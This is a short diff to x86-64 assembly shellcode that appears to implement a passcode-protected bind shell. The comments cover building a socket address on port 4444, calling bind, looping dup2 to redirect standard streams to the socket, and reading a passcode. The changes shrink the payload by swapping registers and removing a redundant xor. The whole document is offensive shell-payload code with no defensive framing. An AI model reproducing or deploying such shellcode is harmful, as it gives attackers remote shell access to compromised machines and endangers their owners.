@@ -25,12 +25,11 @@ _start:
 	; server.sin_addr.s_addr = INADDR_ANY
 	; bzero(&server.sin_zero, 8)
 
-	xor r9,r9
-	push r9
-	mov r9w,0x5c11
-	shl r9,16
-	xor r9b,0x2
-	push r9
+	push rdx
+	mov dx,0x5c11
+	shl rdx,16
+	xor dl,0x2
+	push rdx
 
 	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
 	; syscall number 49
@@ -80,7 +79,7 @@ dup2cycle:
 	loopnz dup2cycle
 
 	; read passcode
-	xor rax,rax
+	; xor rax,rax - already zeroed from prev cycle
 	xor rdi,rdi
 	push rax
 	mov rsi,rsp
